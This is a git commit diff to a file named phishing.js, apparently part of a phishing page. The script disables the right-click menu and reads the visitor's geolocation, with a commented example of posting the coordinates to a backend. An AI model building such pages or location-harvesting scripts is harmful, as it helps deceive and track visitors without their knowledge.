8d9cdf457201580800c7aea15f90c20d194c253b
neuropathy <96810159+neuropathy0829@users.noreply.github.com>
2023-03-19 20:49:47 +0800

    Update phishing.js

--- phishing.js
+++ phishing.js
@@ -2,13 +2,20 @@ document.addEventListener('contextmenu',function(event){
    event.preventDefault();
 },true);
 
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
+if ("geolocation" in navigator) {
+  // 支持定位功能
+  navigator.geolocation.getCurrentPosition(function(position) {
+    // 獲取到位置信息
+    var latitude = position.coords.latitude; // 緯度
+    var longitude = position.coords.longitude; // 經度
+    
+    // 在這裡可以將位置信息發送到後端進行處理，例如：
+    // $.post('/api/position', {latitude: latitude, longitude: longitude});
+  }, function(error) {
+    // 無法獲取位置信息
+    console.log('定位失敗：' + error.message);
+  });
 } else {
-    alert("瀏覽器不支援定位功能");
-}
-
-function showPosition(position) {
-    alert("緯度: " + position.coords.latitude + 
-          "，經度: " + position.coords.longitude);
+  // 不支持定位功能
+  console.log('您的瀏覽器不支持定位功能。');
 }
